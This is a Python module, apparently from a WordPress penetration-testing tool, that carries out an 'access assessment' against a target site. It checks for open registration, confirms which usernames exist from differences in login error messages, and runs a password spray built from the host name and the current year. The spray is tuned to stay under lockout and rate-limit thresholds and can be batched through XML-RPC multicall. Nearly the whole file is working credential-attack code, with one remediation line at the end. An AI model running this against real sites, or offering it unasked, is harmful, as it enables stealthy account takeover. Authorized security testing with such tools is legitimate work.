"""Access assessment: quiet paths into a WordPress site.

Classic dictionary attacks hammer wp-login.php hundreds of times - loud,
lockout-prone, and increasingly hopeless against modern password policies.
This module replaces them with the techniques an actual operator uses:

1. open registration - if wp-login.php?action=register hands out accounts,
   that IS access, for the price of one GET
2. login error differential - WordPress answers "unknown username" and
   "wrong password for user X" differently, so a handful of POSTs tells us
   which accounts really exist before any guessing starts
3. targeted password spray - a dozen high-probability candidates
   (target-derived like {host}{year}!, plus top leaked passwords) across
   the validated users, one attempt per user per round: stays under typical
   lockout thresholds and rate-limit radars
4. --via-xmlrpc folds an entire spray round (N users) into ONE request via
   system.multicall - the quietest way to test credentials that exists

All of this only runs when explicitly requested (--access / --user), against
targets you are authorized to test.
"""

import re
from datetime import date

from .. import config, httpclient
from . import xmlrpc

REGISTRATION_BLOCKED = ("registration is currently not allowed",
                        "registration has been disabled",
                        "not allow new registrations")
REGISTRATION_FORM = re.compile(r'name=["\']user_login["\']', re.I)
UNKNOWN_USER_HINTS = ("invalid username", "unknown username",
                      "there is no account with that username")
WRONG_PASSWORD_HINTS = ("the password you entered", "incorrect password",
                        "password you entered for the user")


def check_open_registration(report, target):
    """True when self-service registration is enabled."""
    resp = httpclient.get(f"{target}wp-login.php?action=register")
    if resp is None or resp.status_code != 200:
        return False
    body = resp.text
    if any(marker in body.lower() for marker in REGISTRATION_BLOCKED):
        report.paragraph("Self-registration is disabled - good.")
        return False
    if REGISTRATION_FORM.search(body):
        print("[!] Open self-registration: anyone can create an account")
        report.paragraph("**Self-registration is ENABLED** - anyone can create a subscriber "
                         "account at `wp-login.php?action=register`. That is instant, "
                         "policy-free access to the site (and subscriber accounts are the "
                         "stepping stone for authenticated-plugin exploits).")
        return True
    report.paragraph("Registration page reachable but its state could not be determined.")
    return False


def validate_usernames(report, target, candidates):
    """Use the login error differential to keep only real usernames.

    One POST per candidate with a definitely-wrong password: 'unknown
    username' styles mark absent accounts, 'wrong password for user X'
    styles mark existing ones.
    """
    valid = []
    for user in candidates:
        resp = _login_post(target, user, f"WpBuddy-Nope-{user}")
        if resp is None:
            continue
        body = resp.text.lower()
        if any(hint in body for hint in WRONG_PASSWORD_HINTS):
            valid.append(user)
            print(f"[*] Login confirms account exists: {user}")
        elif any(hint in body for hint in UNKNOWN_USER_HINTS):
            pass  # account does not exist - drop quietly
    if valid:
        report.paragraph(f"Login error messages confirm these accounts exist: "
                         + ", ".join(f"`{u}`" for u in valid)
                         + " (differential between 'unknown user' and 'wrong password' replies).")
    return valid


def spray_candidates(target, custom_list=None):
    """High-probability passwords: user list or target-derived templates."""
    if custom_list:
        return list(custom_list)
    from ..config import DATA_DIR
    templates = config.load_lines(DATA_DIR / "sprayPasswords.txt")
    host = (urlsplit_host(target) or "target").split(".")[0].lower()
    year = str(date.today().year)
    return [t.replace("{host}", host).replace("{year}", year) for t in templates]


def urlsplit_host(target):
    from urllib.parse import urlsplit
    return urlsplit(target).hostname or ""


def password_spray(report, target, user_candidates, passwords, via_xmlrpc=False):
    """One attempt per user per password round. Returns {(user): password}.

    Stops entirely (no further rounds) once a hit is found OR the login
    endpoint becomes unreachable - grinding on against a blocking/dead login
    only generates noise and lockouts.
    """
    found = {}
    for index, password in enumerate(passwords, 1):
        print(f"[*] Spray round {index}/{len(passwords)} ({len(user_candidates)} user(s))")
        if via_xmlrpc:
            result = _spray_round_xmlrpc(target, user_candidates, password)
            if result:
                found.update(result)
                break
            if result is None:  # transport failed - endpoint blocked or down
                print("[!] xmlrpc.php became unreachable during the spray; stopping")
                break
        else:
            hit, alive = _spray_round_wplogin(target, user_candidates, password)
            if hit:
                found[hit] = password
                break
            if not alive:
                print("[!] wp-login.php became unreachable during the spray "
                      "(blocked or rate-limited?); stopping")
                break
    return found


def _spray_round_wplogin(target, users, password):
    """One attempt per user. Returns (hit_user_or_None, login_reachable)."""
    for user in users:
        resp = _login_post(target, user, password)
        if resp is None:
            return None, False  # unreachable after retries - caller must stop
        if credentials_success(resp):
            return user, True
    return None, True


def _spray_round_xmlrpc(target, users, password):
    # one system.multicall request covers every user for this password
    return xmlrpc.multicall_credentials(target, [(u, password) for u in users])


def _login_post(target, user, password):
    return httpclient.post(
        f"{target}wp-login.php",
        data={"log": user, "pwd": password, "wp-submit": "Log In",
              "redirect_to": f"{target}wp-admin/", "testcookie": "1"},
        headers={"Cookie": "wordpress_test_cookie=WP%20Cookie%20check",
                 "Origin": target.rstrip("/"),
                 "Referer": f"{target}wp-login.php"},
    )


def credentials_success(resp):
    from .credentials import _login_succeeded
    return _login_succeeded(resp)


def run_access(report, target, args, enumerated_users, xmlrpc_alive, dict_list=None):
    """The full quiet-access assessment. Returns found credentials {user: password}."""
    report.section("Access assessment")
    report.paragraph("Quiet alternatives to brute force: registration check, login-error "
                     "user validation, then a small targeted password spray "
                     "(a few high-probability passwords, one attempt per user each round).")

    found = {}

    check_open_registration(report, target)

    # candidate accounts: --user wins, otherwise everything enumeration found
    candidates = [args.user] if args.user else [slug or name
                                                for name, slug in (enumerated_users or [])]
    candidates = list(dict.fromkeys(c for c in candidates if c))[:config.MAX_USER_IDS]

    if not candidates:
        report.paragraph("No candidate usernames (pass --user or let user enumeration run "
                         "first); only the registration check was possible.")
        return found

    valid = validate_usernames(report, target, candidates)
    if not valid:
        report.paragraph("None of the candidate usernames could be confirmed via the login "
                         "error differential - spraying would be pure noise, so it is skipped.")
        return found

    if args.dict:
        passwords, note = dict_list or [], "full dictionary (--dict; loud)"
    else:
        custom = config.load_lines(args.passwordList) if args.passwordList else None
        passwords = custom or spray_candidates(target)
        note = "targeted spray list" + (" (custom)" if custom else "")
    if not passwords:
        report.paragraph("Password list is empty; nothing to spray.")
        return found

    print(f"[*] Credential testing via {note}: {len(passwords)} password(s) x {len(valid)} user(s)")
    via_xmlrpc = args.via_xmlrpc and xmlrpc_alive
    found = password_spray(report, target, valid, passwords, via_xmlrpc=via_xmlrpc)

    if found:
        for user, password in found.items():
            print(f"[!] VALID CREDENTIALS: {user} / {password}")
        report.paragraph("**Valid credentials: "
                         + ", ".join(f"`{u}` / `{p}`" for u, p in found.items())
                         + f"** (via {'XML-RPC multicall' if via_xmlrpc else 'wp-login.php'}, "
                           f"{note})")
        report.paragraph("**Recommendation:** force unique, long passwords + MFA on all accounts, "
                         "and enable login rate limiting that also watches XML-RPC.")
    else:
        report.paragraph(f"No valid credentials from the {note} - this is not proof accounts "
                         f"are safe, only that these candidates missed.")
    return found
